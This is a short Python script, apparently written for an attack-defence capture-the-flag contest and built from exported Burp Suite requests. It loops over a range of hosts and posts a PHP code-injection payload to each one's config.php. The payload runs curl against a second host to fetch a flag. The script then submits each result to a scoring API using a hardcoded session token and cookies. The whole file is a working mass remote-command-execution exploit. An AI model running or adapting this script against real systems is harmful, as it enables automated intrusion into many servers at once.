import requests
import time

for i in range(1,255):

	burp0_url = "http://4.6."+str(i)+".1:80/config.php"
	burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "Origin": "http://4.6.1.1", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://4.6.1.1/config.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
	burp0_data = {"shell": "system('curl -k https://10.251.230.230/Getkey/index/index');"}
	response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	a=response.text


	burp1_url = "https://10.251.230.230:443/api/comp/question/saveAttack"
	burp1_cookies = {"token": "pVodTo0VFYN9jgsdJxfWWkzKpWtR3GsDwNIdPMWukKd8k2q0VQw83GijI-FiIFI7", "think_language": "zh-CN", "PHPSESSID": "n8ddb1ts1k7tkqa1uqdsp4t326"}
	burp1_headers = {"Connection": "close", "sec-ch-ua": "\"Chromium\";v=\"118\", \"Google Chrome\";v=\"118\", \"Not=A?Brand\";v=\"99\"", "Accept": "application/json, text/plain, */*", "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "token": "pVodTo0VFYN9jgsdJxfWWkzKpWtR3GsDwNIdPMWukKd8k2q0VQw83GijI-FiIFI7", "sec-ch-ua-platform": "\"Windows\"", "Origin": "https://10.251.230.230", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://10.251.230.230/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
	burp1_data = {"comp_id": "6", "uanswer": a, "id": "44", "question_id": "10363"}
	response2=requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data,verify=False)
	b=response2.text
	print(b)
	time.sleep(1)